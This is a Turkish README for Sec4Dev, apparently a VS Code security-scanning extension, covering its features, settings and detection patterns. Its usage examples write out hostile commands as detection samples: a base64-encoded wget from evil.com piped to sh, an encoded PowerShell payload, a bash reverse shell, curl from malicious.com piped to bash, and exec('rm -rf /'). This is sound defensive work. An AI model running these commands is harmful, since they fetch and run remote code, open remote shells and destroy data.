# Sec4Dev - Geliştiriciler için Güvenlik

Sec4Dev, geliştiricilerin güvenlik açıklarını tespit etmesine, şüpheli kod kalıplarını bulmasına ve kötü niyetli kod enjeksiyonlarını önlemesine yardımcı olan kapsamlı bir VS Code eklentisidir.

## 🚀 Yeni Özellikler (v1.0.0)

### 1. **Üçüncü Parti Bağımlılık Taraması**
- `package.json`, `requirements.txt`, `composer.json`, `Gemfile`, `go.mod` dosyalarını tarar
- Bilinen güvenlik açıklarını tespit eder
- CVE bilgilerini ve düzeltme önerilerini gösterir

### 2. **Hassas Bilgi Tespiti**
- API anahtarları, şifreler, tokenlar
- Private key'ler ve database URL'leri
- Yorumlarda gizlenmiş hassas bilgiler
- Environment variable önerileri

### 3. **OWASP Top 10 Zafiyet Taraması**
- SQL Injection, XSS, CSRF tespiti
- Broken Access Control
- Cryptographic Failures
- Security Misconfiguration
- Ve diğer OWASP kategorileri

### 4. **AI Destekli Kod Analizi**
- Şüpheli kod niyetini analiz eder
- Malicious, suspicious, benign sınıflandırması
- Güven seviyesi ve açıklama
- Davranış analizi

### 5. **Güvenlik Puanı ve Dashboard**
- 0-100 arası güvenlik puanı
- Haftalık iyileştirme takibi
- Detaylı öneriler ve çözümler
- Görsel dashboard

### 6. **VS Code Entegrasyonu**
- Problems sekmesinde görsel uyarılar
- Code actions ve hover açıklamaları
- Otomatik tarama (save/commit öncesi)
- Real-time güvenlik uyarıları

### 7. **CLI Desteği**
- Terminal üzerinden tarama
- JSON formatında çıktı
- CI/CD entegrasyonu için hazır

### 8. **GitHub Actions**
- PR yorumlarına otomatik sonuç ekleme
- Güvenlik açığı annotations
- Kritik sorunlarda build'i durdurma

### 9. **Terminal Komut Analizi**
- Base64 kodlanmış kötü niyetli komut tespiti
- PowerShell kodlanmış komut analizi
- Gizlenmiş shell komut tespiti
- Reverse shell bağlantı tanımlama
- Dosya indirme ve çalıştırma izleme
- Yetki yükseltme girişimi tespiti
- Ağ tarama komut analizi
- Veri sızıntısı kalıp tanıma

## Komutlar

### Temel Taramalar
- `Sec4Dev: Scan Document for Security Issues` - Aktif dosyayı tara
- `Sec4Dev: Scan Workspace for Security Issues` - Tüm workspace'i tara
- `Sec4Dev: Scan Dependencies for Vulnerabilities` - Bağımlılıkları tara
- `Sec4Dev: Scan for Secrets and API Keys` - Hassas bilgileri tara
- `Sec4Dev: OWASP Top 10 Vulnerability Scan` - OWASP zafiyetlerini tara

### Gelişmiş Özellikler
- `Sec4Dev: Show Security Score Dashboard` - Güvenlik puanı paneli
- `Sec4Dev: CLI Security Scan` - CLI tarama

## Konfigürasyon

VS Code ayarlarından yapılandırılabilir:

- `sec4dev.enableRealTimeScanning`: Gerçek zamanlı tarama (varsayılan: true)
- `sec4dev.showWarnings`: Güvenlik uyarıları (varsayılan: true)
- `sec4dev.enableDependencyScanning`: Bağımlılık taraması (varsayılan: true)
- `sec4dev.enableSecretScanning`: Hassas bilgi taraması (varsayılan: true)
- `sec4dev.enableOWASPScanning`: OWASP taraması (varsayılan: true)
- `sec4dev.enableAIAnalysis`: AI analizi (varsayılan: true)
- `sec4dev.autoScanOnSave`: Kaydetme sırasında otomatik tarama (varsayılan: false)
- `sec4dev.autoScanOnCommit`: Commit öncesi otomatik tarama (varsayılan: true)
- `sec4dev.securityScoreThreshold`: Minimum güvenlik puanı (varsayılan: 70)

## Tespit Edilen Güvenlik Kalıpları

### 🚨 Yüksek Risk - Kritik Zafiyetler
- `eval()` fonksiyon çağrıları - Doğrudan kod çalıştırma
- `Function()` constructor string parametreleri - Dinamik kod oluşturma
- `setTimeout()` string kodu ile - Gecikmeli kod çalıştırma
- `setInterval()` string kodu ile - Tekrarlı kod çalıştırma
- `exec()` ve `spawn()` çağrıları - Process çalıştırma
- `child_process` kullanımı - Sistem komut çalıştırma

### ⚠️ Orta Risk - Potansiyel Tehditler
- XOR işlemleri (`^` operatör kullanımı) - Yaygın obfuscation tekniği
- Base64 encoding/decoding (`atob()`, `btoa()`) - Veri gizleme
- Encryption/decryption fonksiyonları - Potansiyel payload encoding
- Buffer işlemleri base64 ile - Binary veri manipülasyonu

### ℹ️ Düşük Risk - Şüpheli Kalıplar
- `unescape()` kullanımı - Eski encoding
- `decodeURIComponent()` çağrıları - URL encoding
- `String.fromCharCode()` kullanımı - Karakter manipülasyonu
- Karakter kodu işlemleri - Potansiyel encoding

### 🚨 Terminal Kötü Niyetli Komut Tespiti
- Base64 kodlanmış komutlar (`echo "base64string" | base64 -d | bash`)
- Kodlanmış PowerShell komutları (`powershell -enc "encodedcommand"`)
- XOR kodlaması ile gizlenmiş shell komutları
- URL-kodlanmış terminal komutları
- Hex-kodlanmış kötü niyetli payload'lar
- Reverse shell bağlantıları (`nc -e /bin/bash`, `bash -i >&`)
- Dosya indirme ve çalıştırma (`wget`, `curl` ile bash'e pipe)
- Yetki yükseltme girişimleri (`sudo`, `su` kodlanmış parametrelerle)
- Ağ tarama komutları (`nmap`, `netcat` şüpheli flag'lerle)
- Veri sızıntısı kalıpları (`tar`, `zip` ağ çıktısıyla)

## Kurulum

1. Bu repository'yi klonlayın
2. `npm install` ile bağımlılıkları yükleyin
3. `npm run compile` ile extension'ı derleyin
4. VS Code'da `F5` ile debug modunda çalıştırın

## Geliştirme

```bash
# Bağımlılıkları yükle
npm install

# TypeScript'i derle
npm run compile

# Değişiklikleri izle
npm run watch

# Testleri çalıştır
npm test

# Extension'ı paketle
npm run package
```

## Kullanım Örnekleri

### Örnek 1: Eval tespiti
```javascript
// Bu YÜKSEK RİSK olarak tespit edilecek
const result = eval("console.log('Hello World')");
```

### Örnek 2: XOR obfuscation tespiti
```javascript
// Bu ORTA RİSK olarak tespit edilecek
const key = 0x42;
const encrypted = data ^ key;
```

### Örnek 3: Base64 tespiti
```javascript
// Bu ORTA RİSK olarak tespit edilecek
const decoded = atob("SGVsbG8gV29ybGQ=");
```

### Örnek 4: Process çalıştırma tespiti
```javascript
// Bu YÜKSEK RİSK olarak tespit edilecek
const { exec } = require('child_process');
exec('rm -rf /', (error, stdout, stderr) => {
    console.log(stdout);
});
```

### Örnek 5: Hassas bilgi tespiti
```javascript
// Bu YÜKSEK RİSK olarak tespit edilecek
const apiKey = "sk-1234567890abcdef";
const password = "mypassword123";
```

### Örnek 6: Terminal kötü niyetli komut tespiti
```bash
# Bu YÜKSEK RİSK olarak tespit edilecek - Base64 kodlanmış komut
echo "d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBzaA==" | base64 -d | bash

# Bu YÜKSEK RİSK olarak tespit edilecek - PowerShell kodlanmış komut
powershell -enc "JABwYXlsb2FkID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJpdm9yL2Z1anNvL2Z1anNvIik7IEludm9rZS1FeHByZXNzaW9uICRwYXlsb2Fk"

# Bu YÜKSEK RİSK olarak tespit edilecek - Reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Bu ORTA RİSK olarak tespit edilecek - Dosya indirme ve çalıştırma
curl -s http://malicious.com/payload.sh | bash
```

## Güvenlik En İyi Uygulamaları

1. **eval() kullanmayın**: Production kodunda asla eval() kullanmayın
2. **JSON.parse() kullanın**: JSON verisi için eval() yerine JSON.parse() kullanın
3. **Input doğrulayın**: Kullanıcı girdisini her zaman doğrulayın ve sanitize edin
4. **CSP kullanın**: Content Security Policy header'ları uygulayın
5. **Kod incelemesi**: Güvenlik sorunları için düzenli kod incelemesi yapın
6. **Statik analiz**: Sec4Dev gibi otomatik tarama araçları kullanın
7. **En az ayrıcalık prensibi**: Sadece gerekli izinleri verin
8. **Düzenli güncellemeler**: Bağımlılıkları ve araçları güncel tutun

## Tehdit Önleme

Sec4Dev şunları önlemeye yardımcı olur:
- **Kod Enjeksiyon Saldırıları**: eval() ve dinamik kod çalıştırmayı tespit ederek
- **Obfuscated Malware**: XOR ve encoding kalıplarını tanımlayarak
- **Veri Sızıntısı**: Şüpheli encoding/decoding'i tespit ederek
- **Process Enjeksiyonu**: Sistem çağrılarını ve process çalıştırmayı izleyerek
- **Supply Chain Saldırıları**: Bağımlılıklardaki şüpheli kalıpları tarayarak

## Katkıda Bulunma

Sorun bildirimleri ve geliştirme istekleri için lütfen issue açın!

## Lisans

MIT License - detaylar için LICENSE dosyasına bakın.

## İletişim

- LinkedIn: linkedin.com/in/melihaybar/
- GitHub: github.com/notrealtrick 